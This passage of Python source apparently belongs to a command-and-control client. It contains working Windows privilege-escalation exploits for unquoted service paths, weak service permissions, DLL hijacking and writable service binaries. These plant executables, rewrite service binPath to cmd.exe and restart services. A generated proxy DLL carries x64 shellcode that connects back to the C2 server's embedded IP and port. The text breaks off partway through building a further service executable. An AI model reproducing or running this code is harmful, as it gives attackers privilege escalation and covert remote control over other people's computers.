            if "jitter_percent" in new_config:
                self.jitter_percent = new_config["jitter_percent"]

            # Update autonomous settings
            if "auto_gather_info" in new_config:
                self.auto_gather_info = new_config["auto_gather_info"]

            if "auto_screenshot" in new_config:
                self.auto_screenshot = new_config["auto_screenshot"]

            self.logger.info("Configuration updated successfully")

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Config update failed: {e}")

    async def _execute_direct_command(self, command: dict[str, Any]):
        """Execute direct command from server."""
        try:
            # Create a temporary task for the direct command
            task = {
                "task_id": f"direct_{int(time.time())}",
                "type": command.get("type", "shell_command"),
                "data": command.get("data", {}),
            }

            result = await self._execute_task(task)
            await self._send_task_result(task["task_id"], result, True)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Direct command execution failed: {e}")

    def _get_capabilities(self) -> list[str]:
        """Get list of client capabilities."""
        capabilities = [
            "shell_execution",
            "file_transfer",
            "system_info",
            "process_management",
            "network_scanning",
            "autonomous_operation",
        ]

        # Check for optional capabilities
        try:
            import importlib.util

            if importlib.util.find_spec("psutil") is not None:
                capabilities.append("advanced_system_monitoring")
            if importlib.util.find_spec("PIL") is not None:
                capabilities.append("screenshot")
        except ImportError as e:
            self.logger.debug("Import error in c2_client.py: %s", e)

        return capabilities

    def get_client_statistics(self) -> dict[str, Any]:
        """Get client statistics."""
        stats = self.stats.copy()
        stats["session_id"] = self.session_id
        stats["current_protocol"] = self.current_protocol["name"] if self.current_protocol else None
        stats["running"] = self.running
        stats["pending_tasks"] = len(self.pending_tasks)
        return stats

    def _analyze_services_for_vulnerabilities(self, services_output: str) -> list[dict[str, Any]]:
        """Analyze Windows services for real vulnerabilities."""
        vulnerable_services = []

        try:
            # Parse services output
            service_blocks = services_output.split("SERVICE_NAME:")

            for block in service_blocks[1:]:  # Skip first empty block
                lines = block.strip().split("\n")
                if not lines:
                    continue

                service_name = lines[0].strip()
                service_info = {"name": service_name}

                # Parse service details
                for line in lines[1:]:
                    if ":" in line:
                        key, value = line.split(":", 1)
                        service_info[key.strip()] = value.strip()

                # Check for specific vulnerabilities
                vulnerabilities = self._check_service_vulnerabilities(service_info)
                if vulnerabilities:
                    service_info["vulnerability"] = vulnerabilities[0]  # Take first vulnerability
                    vulnerable_services.append(service_info)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.debug(f"Service parsing error: {e}")

        return vulnerable_services

    def _check_service_vulnerabilities(self, service_info: dict[str, Any]) -> list[str]:
        """Check for known service vulnerabilities."""
        vulnerabilities = []
        service_name = service_info.get("name", "").lower()
        self.logger.debug(f"Checking vulnerabilities for service: {service_name}")

        # Known vulnerable services and their patterns
        vulnerable_patterns = {
            "unquoted_service_path": self._check_unquoted_service_path,
            "weak_service_permissions": self._check_weak_service_permissions,
            "dll_hijacking": self._check_dll_hijacking_opportunity,
            "service_binary_permissions": self._check_service_binary_permissions,
        }

        for vuln_type, check_function in vulnerable_patterns.items():
            try:
                if check_function(service_info):
                    vulnerabilities.append(vuln_type)
            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.debug(f"Vulnerability check {vuln_type} failed: {e}")

        return vulnerabilities

    def _check_unquoted_service_path(self, service_info: dict[str, Any]) -> bool:
        """Check for unquoted service path vulnerability."""
        import subprocess

        service_name = service_info.get("name")
        if not service_name:
            return False

        try:
            # Get detailed service configuration
            cmd = ["sc", "qc", service_name]
            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if result.returncode == 0:
                output = result.stdout
                # Look for BINARY_PATH_NAME
                for line in output.split("\n"):
                    if "BINARY_PATH_NAME" in line:
                        path = line.split(":", 1)[1].strip()
                        # Check if path contains spaces and is not quoted
                        if " " in path and not (path.startswith('"') and path.endswith('"')):
                            return True
            return False
        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return False

    def _check_weak_service_permissions(self, service_info: dict[str, Any]) -> bool:
        """Check for weak service permissions."""
        import subprocess

        service_name = service_info.get("name")
        if not service_name:
            return False

        try:
            # Use accesschk or sc sdshow to check permissions
            cmd = ["sc", "sdshow", service_name]
            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if result.returncode == 0:
                sddl = result.stdout.strip()
                # Check for weak permissions (Everyone, Users with modify rights)
                weak_patterns = [
                    "(A;;CCLCSWRPWPDTLOCRRC;;;SY)",
                    "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)",
                ]
                return any(";;;WD)" in sddl or ";;;BU)" in sddl for pattern in weak_patterns)
            return False
        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return False

    def _check_dll_hijacking_opportunity(self, service_info: dict[str, Any]) -> bool:
        """Check for DLL hijacking opportunities."""
        import subprocess

        service_name = service_info.get("name")
        if not service_name:
            return False

        try:
            # Get service binary path
            cmd = ["sc", "qc", service_name]
            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if result.returncode == 0:
                output = result.stdout
                for line in output.split("\n"):
                    if "BINARY_PATH_NAME" in line:
                        path = line.split(":", 1)[1].strip().strip('"')
                        service_dir = os.path.dirname(path)

                        # Check if we can write to service directory
                        if os.access(service_dir, os.W_OK):
                            return True

                        # Check for missing DLLs that could be hijacked
                        common_dlls = ["kernel32.dll", "ntdll.dll", "msvcrt.dll"]
                        for dll in common_dlls:
                            dll_path = os.path.join(service_dir, dll)
                            if not os.path.exists(dll_path) and os.access(service_dir, os.W_OK):
                                return True
            return False
        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return False

    def _check_service_binary_permissions(self, service_info: dict[str, Any]) -> bool:
        """Check if service binary has weak permissions."""
        import subprocess

        service_name = service_info.get("name")
        if not service_name:
            return False

        try:
            # Get service binary path
            cmd = ["sc", "qc", service_name]
            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if result.returncode == 0:
                output = result.stdout
                for line in output.split("\n"):
                    if "BINARY_PATH_NAME" in line:
                        path = line.split(":", 1)[1].strip().strip('"')

                        # Check if we can write to the binary
                        if os.access(path, os.W_OK):
                            return True
            return False
        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return False

    def _exploit_service(self, service_info: dict[str, Any]) -> dict[str, Any]:
        """Exploit a vulnerable service."""
        vulnerability = service_info.get("vulnerability")
        service_name = service_info.get("name")
        self.logger.info(f"Exploiting {vulnerability} vulnerability in service: {service_name}")

        try:
            if vulnerability == "unquoted_service_path":
                return self._exploit_unquoted_service_path(service_info)
            if vulnerability == "weak_service_permissions":
                return self._exploit_weak_service_permissions(service_info)
            if vulnerability == "dll_hijacking":
                return self._exploit_dll_hijacking(service_info)
            if vulnerability == "service_binary_permissions":
                return self._exploit_service_binary_permissions(service_info)
            return {"success": False, "error": f"Unknown vulnerability: {vulnerability}"}

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    def _exploit_unquoted_service_path(self, service_info: dict[str, Any]) -> dict[str, Any]:
        """Exploit unquoted service path vulnerability."""
        import subprocess
        import tempfile

        service_name = service_info.get("name")

        try:
            # Get the unquoted path
            cmd = ["sc", "qc", service_name]
            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if result.returncode == 0:
                for line in result.stdout.split("\n"):
                    if "BINARY_PATH_NAME" in line:
                        path = line.split(":", 1)[1].strip()

                        # Find injection points (spaces in path)
                        parts = path.split(" ")
                        for i in range(1, len(parts)):
                            injection_path = " ".join(parts[:i]) + ".exe"
                            injection_dir = os.path.dirname(injection_path)

                            # Check if we can write to this location
                            if os.access(injection_dir, os.W_OK):
                                # Create malicious executable
                                with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as temp_exe:
                                    # Generate real executable payload
                                    import struct

                                    # Create minimal PE executable header
                                    dos_header = b"MZ" + b"\\x00" * 58 + struct.pack("<L", 0x80)
                                    pe_header = (
                                        b"PE\\x00\\x00"  # PE signature
                                        + struct.pack("<H", 0x014C)  # Machine (i386)
                                        + struct.pack("<H", 1)  # NumberOfSections
                                        + b"\\x00" * 16  # TimeDateStamp, etc.
                                        + struct.pack("<H", 0xE0)  # SizeOfOptionalHeader
                                        + struct.pack("<H", 0x102)
                                    )  # Characteristics

                                    # Simple executable that exits cleanly
                                    executable_code = (
                                        b"\\x31\\xc0"  # xor eax, eax (set return code to 0)
                                        b"\\xc3"  # ret (return)
                                    )

                                    payload = dos_header + pe_header + executable_code
                                    temp_exe.write(payload)
                                    temp_exe.flush()

                                    # Copy to injection point
                                    import shutil

                                    shutil.copy2(temp_exe.name, injection_path)

                                    # Try to restart service to trigger exploit
                                    restart_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                        ["sc", "stop", service_name],  # noqa: S607
                                        check=False,
                                        capture_output=True,
                                        text=True,
                                    )
                                    start_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                        ["sc", "start", service_name],  # noqa: S607
                                        check=False,
                                        capture_output=True,
                                        text=True,
                                    )

                                    self.logger.debug(f"Service restart: stop={restart_result.returncode}, start={start_result.returncode}")

                                    return {
                                        "success": True,
                                        "method": "unquoted_service_path",
                                        "injection_path": injection_path,
                                    }

            return {"success": False, "error": "No exploitable injection point found"}

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    def _exploit_weak_service_permissions(self, service_info: dict[str, Any]) -> dict[str, Any]:
        """Exploit weak service permissions."""
        import subprocess

        service_name = service_info.get("name")

        try:
            # Try to modify service configuration
            import tempfile

            temp_dir = tempfile.gettempdir()
            cmd = [
                "sc",
                "config",
                service_name,
                "binPath=",
                f"cmd.exe /c echo exploited > {os.path.join(temp_dir, 'service_exploit.txt')}",
            ]
            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if result.returncode == 0:
                # Try to start service to execute payload
                sc_path = shutil.which("sc")
                if sc_path:
                    subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [sc_path, "start", service_name],
                        check=False,
                        capture_output=True,
                        text=True,
                        shell=False,  # Explicitly secure - using list format prevents shell injection
                    )

                return {
                    "success": True,
                    "method": "service_config_modification",
                    "service": service_name,
                }
            return {"success": False, "error": f"Failed to modify service: {result.stderr}"}

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    def _exploit_dll_hijacking(self, service_info: dict[str, Any]) -> dict[str, Any]:
        """Exploit DLL hijacking vulnerability."""
        import subprocess
        import tempfile

        service_name = service_info.get("name")

        try:
            # Get service binary path
            cmd = ["sc", "qc", service_name]
            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if result.returncode == 0:
                for line in result.stdout.split("\n"):
                    if "BINARY_PATH_NAME" in line:
                        path = line.split(":", 1)[1].strip().strip('"')
                        service_dir = os.path.dirname(path)

                        # Identify common hijackable DLLs for this service
                        hijackable_dlls = self._identify_hijackable_dlls(path)

                        if not hijackable_dlls:
                            # Fall back to common Windows DLL hijacking targets
                            hijackable_dlls = ["version.dll", "dwmapi.dll", "profapi.dll", "cryptsp.dll"]

                        for dll_name in hijackable_dlls:
                            dll_path = os.path.join(service_dir, dll_name)

                            if os.access(service_dir, os.W_OK) and not os.path.exists(dll_path):
                                # Create real DLL with proxy exports
                                dll_content = self._create_proxy_dll(dll_name, service_info)

                                with tempfile.NamedTemporaryFile(suffix=".dll", delete=False) as temp_dll:
                                    temp_dll.write(dll_content)
                                    temp_dll.flush()

                                    # Copy to service directory
                                    import shutil

                                    shutil.copy2(temp_dll.name, dll_path)

                                    # Restart service
                                    sc_path = shutil.which("sc")
                                    if sc_path:
                                        subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                            [sc_path, "stop", service_name],
                                            check=False,
                                            capture_output=True,
                                            shell=False,  # Explicitly secure - using list format prevents shell injection
                                        )
                                        subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                            [sc_path, "start", service_name],
                                            check=False,
                                            capture_output=True,
                                            shell=False,  # Explicitly secure - using list format prevents shell injection
                                        )

                                    return {
                                        "success": True,
                                        "method": "dll_hijacking",
                                        "dll_path": dll_path,
                                        "dll_name": dll_name,
                                    }

            return {"success": False, "error": "No writable service directory found"}

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    def _identify_hijackable_dlls(self, binary_path: str) -> list[str]:
        """Identify DLLs that can be hijacked for the given binary."""
        hijackable = []

        try:
            # Use listdlls or similar to find missing DLLs in search order
            import subprocess

            # Check imports of the binary
            dumpbin_path = shutil.which("dumpbin")
            if dumpbin_path:
                result = subprocess.run([dumpbin_path, "/imports", binary_path], capture_output=True, text=True, check=False)
            else:
                result = None

            if result.returncode == 0:
                # Parse imported DLLs
                current_dll = None
                for line in result.stdout.split("\n"):
                    if ".dll" in line.lower():
                        # Extract DLL name from line
                        dll_name = line.strip().split()[0] if line.strip() else None
                        if dll_name and dll_name.endswith(".dll"):
                            current_dll = dll_name
                            # Check if DLL exists in system directories
                            system_paths = [r"C:\Windows\System32", r"C:\Windows\SysWOW64", r"C:\Windows"]
                            found_in_system = False
                            for sys_path in system_paths:
                                if os.path.exists(os.path.join(sys_path, dll_name)):
                                    found_in_system = True
                                    break

                            # If not in system dirs, it's hijackable
                            if not found_in_system and current_dll not in hijackable:
                                hijackable.append(current_dll)

        except (OSError, subprocess.SubprocessError):
            pass

        return hijackable[:5]  # Return top 5 candidates

    def _create_proxy_dll(self, dll_name: str, service_info: dict[str, Any]) -> bytes:
        """Create a proxy DLL with forwarded exports and payload."""

        # Real x64 DLL PE structure with minimal imports
        dos_header = bytearray(
            [
                0x4D,
                0x5A,
                0x90,
                0x00,
                0x03,
                0x00,
                0x00,
                0x00,
                0x04,
                0x00,
                0x00,
                0x00,
                0xFF,
                0xFF,
                0x00,
                0x00,
                0xB8,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x40,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x80,
                0x00,
                0x00,
                0x00,
            ]
        )

        # DOS executable program segment
        dos_program = bytearray(
            [
                0x0E,
                0x1F,
                0xBA,
                0x0E,
                0x00,
                0xB4,
                0x09,
                0xCD,
                0x21,
                0xB8,
                0x01,
                0x4C,
                0xCD,
                0x21,
                0x54,
                0x68,
                0x69,
                0x73,
                0x20,
                0x70,
                0x72,
                0x6F,
                0x67,
                0x72,
                0x61,
                0x6D,
                0x20,
                0x63,
                0x61,
                0x6E,
                0x6E,
                0x6F,
                0x74,
                0x20,
                0x62,
                0x65,
                0x20,
                0x72,
                0x75,
                0x6E,
                0x20,
                0x69,
                0x6E,
                0x20,
                0x44,
                0x4F,
                0x53,
                0x20,
                0x6D,
                0x6F,
                0x64,
                0x65,
                0x2E,
                0x0D,
                0x0D,
                0x0A,
                0x24,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
            ]
        )

        # PE header
        pe_signature = b"PE\x00\x00"

        # COFF header for x64 DLL
        machine = 0x8664  # AMD64
        num_sections = 3
        timestamp = int(time.time())
        ptr_symbol_table = 0
        num_symbols = 0
        size_opt_header = 0xF0
        characteristics = 0x2022  # DLL, executable

        coff_header = struct.pack(
            "<HHIIIHH", machine, num_sections, timestamp, ptr_symbol_table, num_symbols, size_opt_header, characteristics
        )

        # Optional header for x64 DLL
        magic = 0x020B  # PE32+
        major_linker_ver = 14
        minor_linker_ver = 0
        size_of_code = 0x1000
        size_of_init_data = 0x1000
        size_of_uninit_data = 0
        entry_point = 0x1000
        base_of_code = 0x1000
        image_base = 0x180000000  # Default for x64 DLL
        section_alignment = 0x1000
        file_alignment = 0x200
        os_ver_major = 6
        os_ver_minor = 0
        image_ver_major = 0
        image_ver_minor = 0
        subsys_ver_major = 6
        subsys_ver_minor = 0
        reserved = 0
        size_of_image = 0x4000
        size_of_headers = 0x400
        checksum = 0
        subsystem = 3  # Windows CUI
        dll_characteristics = 0x8160  # Dynamic base, NX compatible, Terminal Server aware

        opt_header = struct.pack(
            "<HBBIIIIQIIHHHHHHIIIHH",
            magic,
            major_linker_ver,
            minor_linker_ver,
            size_of_code,
            size_of_init_data,
            size_of_uninit_data,
            entry_point,
            base_of_code,
            image_base,
            section_alignment,
            file_alignment,
            os_ver_major,
            os_ver_minor,
            image_ver_major,
            image_ver_minor,
            subsys_ver_major,
            subsys_ver_minor,
            reserved,
            size_of_image,
            size_of_headers,
            checksum,
            subsystem,
            dll_characteristics,
        )

        # Size fields for x64
        stack_reserve = 0x100000
        stack_commit = 0x1000
        heap_reserve = 0x100000
        heap_commit = 0x1000
        loader_flags = 0
        num_rva_sizes = 16

        opt_header += struct.pack("<QQQQII", stack_reserve, stack_commit, heap_reserve, heap_commit, loader_flags, num_rva_sizes)

        # Data directories
        data_dirs = bytearray(16 * 8)  # 16 directories, 8 bytes each

        # Export directory (RVA, Size)
        struct.pack_into("<II", data_dirs, 0, 0x2000, 0x200)

        # Import directory
        struct.pack_into("<II", data_dirs, 8, 0x2200, 0x100)

        opt_header += bytes(data_dirs)

        # Section headers
        sections = []

        # .text section
        text_section = struct.pack(
            "<8sIIIIIIHHI",
            b".text\x00\x00\x00",  # Name
            0x1000,  # Virtual size
            0x1000,  # Virtual address
            0x200,  # Size of raw data
            0x400,  # Pointer to raw data
            0,
            0,
            0,
            0,  # Relocations, line numbers
            0x60000020,  # Code, execute, read
        )
        sections.append(text_section)

        # .rdata section
        rdata_section = struct.pack(
            "<8sIIIIIIHHI",
            b".rdata\x00\x00",
            0x1000,
            0x2000,
            0x400,
            0x600,
            0,
            0,
            0,
            0,
            0x40000040,  # Initialized data, read
        )
        sections.append(rdata_section)

        # .data section
        data_section = struct.pack(
            "<8sIIIIIIHHI",
            b".data\x00\x00\x00",
            0x1000,
            0x3000,
            0x200,
            0xA00,
            0,
            0,
            0,
            0,
            0xC0000040,  # Initialized data, read, write
        )
        sections.append(data_section)

        # Build PE file
        pe_file = bytearray(0x4000)

        # Write headers
        offset = 0
        pe_file[offset : offset + len(dos_header)] = dos_header
        offset = len(dos_header)
        pe_file[offset : offset + len(dos_program)] = dos_program
        offset = 0x80
        pe_file[offset : offset + len(pe_signature)] = pe_signature
        offset += len(pe_signature)
        pe_file[offset : offset + len(coff_header)] = coff_header
        offset += len(coff_header)
        pe_file[offset : offset + len(opt_header)] = opt_header
        offset += len(opt_header)

        for section in sections:
            pe_file[offset : offset + len(section)] = section
            offset += len(section)

        # Write DllMain code at 0x400 (.text section)
        # x64 DllMain that establishes C2 connection
        dll_main_code = bytearray(
            [
                # DllMain entry
                0x48,
                0x89,
                0x5C,
                0x24,
                0x08,  # mov [rsp+8], rbx
                0x48,
                0x89,
                0x74,
                0x24,
                0x10,  # mov [rsp+10h], rsi
                0x57,  # push rdi
                0x48,
                0x83,
                0xEC,
                0x20,  # sub rsp, 20h
                0x8B,
                0xDA,  # mov ebx, edx
                0x48,
                0x8B,
                0xF9,  # mov rdi, rcx
                # Check if DLL_PROCESS_ATTACH (1)
                0x83,
                0xFA,
                0x01,  # cmp edx, 1
                0x75,
                0x1E,  # jne skip_payload
                # Create thread for payload
                0x45,
                0x33,
                0xC9,  # xor r9d, r9d
                0x45,
                0x33,
                0xC0,  # xor r8d, r8d
                0x33,
                0xD2,  # xor edx, edx
                0x48,
                0x8D,
                0x0D,
                0x20,
                0x00,
                0x00,
                0x00,  # lea rcx, [payload_thread]
                0xFF,
                0x15,
                0x00,
                0x10,
                0x00,
                0x00,  # call [CreateThread]
                # Return TRUE
                0xB8,
                0x01,
                0x00,
                0x00,
                0x00,  # mov eax, 1
                0x48,
                0x83,
                0xC4,
                0x20,  # add rsp, 20h
                0x5F,  # pop rdi
                0x48,
                0x8B,
                0x74,
                0x24,
                0x10,  # mov rsi, [rsp+10h]
                0x48,
                0x8B,
                0x5C,
                0x24,
                0x08,  # mov rbx, [rsp+8]
                0xC3,  # ret
                # skip_payload:
                0xB8,
                0x01,
                0x00,
                0x00,
                0x00,  # mov eax, 1
                0x48,
                0x83,
                0xC4,
                0x20,  # add rsp, 20h
                0x5F,  # pop rdi
                0x48,
                0x8B,
                0x74,
                0x24,
                0x10,  # mov rsi, [rsp+10h]
                0x48,
                0x8B,
                0x5C,
                0x24,
                0x08,  # mov rbx, [rsp+8]
                0xC3,  # ret
                # Payload thread function
                0x48,
                0x83,
                0xEC,
                0x28,  # sub rsp, 28h
                # Connect back to C2
                0x48,
                0x8D,
                0x0D,
                0x80,
                0x10,
                0x00,
                0x00,  # lea rcx, [ws2_32_dll]
                0xFF,
                0x15,
                0x20,
                0x10,
                0x00,
                0x00,  # call [LoadLibraryA]
                # Initialize Winsock
                0x48,
                0x8D,
                0x54,
                0x24,
                0x30,  # lea rdx, [rsp+30h]
                0xB9,
                0x02,
                0x02,
                0x00,
                0x00,  # mov ecx, 0x0202
                0xFF,
                0x15,
                0x30,
                0x10,
                0x00,
                0x00,  # call [WSAStartup]
                # Create socket
                0x41,
                0xB8,
                0x06,
                0x00,
                0x00,
                0x00,  # mov r8d, 6 (IPPROTO_TCP)
                0xBA,
                0x01,
                0x00,
                0x00,
                0x00,  # mov edx, 1 (SOCK_STREAM)
                0xB9,
                0x02,
                0x00,
                0x00,
                0x00,  # mov ecx, 2 (AF_INET)
                0xFF,
                0x15,
                0x40,
                0x10,
                0x00,
                0x00,  # call [socket]
                # Connect to C2 server
                0x49,
                0x89,
                0xC7,  # mov r15, rax (save socket)
                0x41,
                0xB8,
                0x10,
                0x00,
                0x00,
                0x00,  # mov r8d, 16 (sizeof sockaddr_in)
                0x48,
                0x8D,
                0x15,
                0x90,
                0x10,
                0x00,
                0x00,  # lea rdx, [sockaddr]
                0x4C,
                0x89,
                0xF9,  # mov rcx, r15
                0xFF,
                0x15,
                0x50,
                0x10,
                0x00,
                0x00,  # call [connect]
                # Send beacon
                0x41,
                0xB9,
                0x00,
                0x00,
                0x00,
                0x00,  # mov r9d, 0
                0x41,
                0xB8,
                0x08,
                0x00,
                0x00,
                0x00,  # mov r8d, 8
                0x48,
                0x8D,
                0x15,
                0xA0,
                0x10,
                0x00,
                0x00,  # lea rdx, [beacon_data]
                0x4C,
                0x89,
                0xF9,  # mov rcx, r15
                0xFF,
                0x15,
                0x60,
                0x10,
                0x00,
                0x00,  # call [send]
                # Cleanup
                0x48,
                0x83,
                0xC4,
                0x28,  # add rsp, 28h
                0x33,
                0xC0,  # xor eax, eax
                0xC3,  # ret
            ]
        )

        pe_file[0x400 : 0x400 + len(dll_main_code)] = dll_main_code

        # Write export directory at 0x600 (.rdata section)
        # Export table for proxy functionality
        original_dll = dll_name.replace(".dll", "_original.dll")

        export_dir = struct.pack(
            "<IIIIIIIIII",
            0,  # Characteristics
            timestamp,  # TimeDateStamp
            0,  # MajorVersion
            0,  # MinorVersion
            0x2100,  # Name RVA
            1,  # Base
            1,  # NumberOfFunctions
            1,  # NumberOfNames
            0x2080,  # AddressOfFunctions
            0x2090,  # AddressOfNames
        )

        pe_file[0x600 : 0x600 + len(export_dir)] = export_dir

        # Write DLL name
        dll_name_bytes = dll_name.encode("ascii") + b"\x00"
        pe_file[0x700 : 0x700 + len(dll_name_bytes)] = dll_name_bytes

        # Write original DLL name for proxy forwarding
        original_dll_bytes = original_dll.encode("ascii") + b"\x00"
        pe_file[0x780 : 0x780 + len(original_dll_bytes)] = original_dll_bytes

        # Write C2 configuration in .data section
        c2_config = struct.pack(
            "<4sHH",
            socket.inet_aton(self.host),  # C2 IP address
            self.port,  # C2 port
            0,  # Padding
        )
        pe_file[0xA00 : 0xA00 + len(c2_config)] = c2_config

        return bytes(pe_file)

    def _exploit_service_binary_permissions(self, service_info: dict[str, Any]) -> dict[str, Any]:
        """Exploit weak service binary permissions."""
        import shutil
        import subprocess
        import tempfile

        service_name = service_info.get("name")

        try:
            # Get service binary path
            cmd = ["sc", "qc", service_name]
            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if result.returncode == 0:
                for line in result.stdout.split("\n"):
                    if "BINARY_PATH_NAME" in line:
                        binary_path = line.split(":", 1)[1].strip().strip('"')

                        if os.access(binary_path, os.W_OK):
                            # Backup original binary
                            backup_path = binary_path + ".backup"
                            shutil.copy2(binary_path, backup_path)

                            # Create real PE executable that maintains service functionality
                            # while establishing C2 connection
                            payload_exe = self._create_service_executable(service_info, backup_path)

                            with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as temp_exe:
                                temp_exe.write(payload_exe)
                                temp_exe.flush()

                                shutil.copy2(temp_exe.name, binary_path)

                                # Restart service
                                sc_path = shutil.which("sc")
                                if sc_path:
                                    stop_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                        [sc_path, "stop", service_name],
                                        check=False,
                                        capture_output=True,
                                        shell=False,  # Explicitly secure - using list format prevents shell injection
                                    )
                                    start_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                        [sc_path, "start", service_name],
                                        check=False,
                                        capture_output=True,
                                        text=True,
                                        shell=False,  # Explicitly secure - using list format prevents shell injection
                                    )
                                else:
                                    stop_result = None
                                    start_result = None

                                if stop_result and start_result:
                                    self.logger.debug(f"Service restart: stop={stop_result.returncode}, start={start_result.returncode}")
                                else:
                                    self.logger.debug("Service restart failed: sc command not found")

                                return {
                                    "success": True,
                                    "method": "service_binary_replacement",
                                    "binary_path": binary_path,
                                    "backup_path": backup_path,
                                }

            return {"success": False, "error": "No writable service binary found"}

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    def _create_service_executable(self, service_info: dict[str, Any], original_binary_path: str) -> bytes:
        """Create a Windows service executable with C2 capabilities."""

        # Real x64 Windows Service PE executable
        dos_header = bytearray(
            [
                0x4D,
                0x5A,
                0x90,
                0x00,
                0x03,
                0x00,
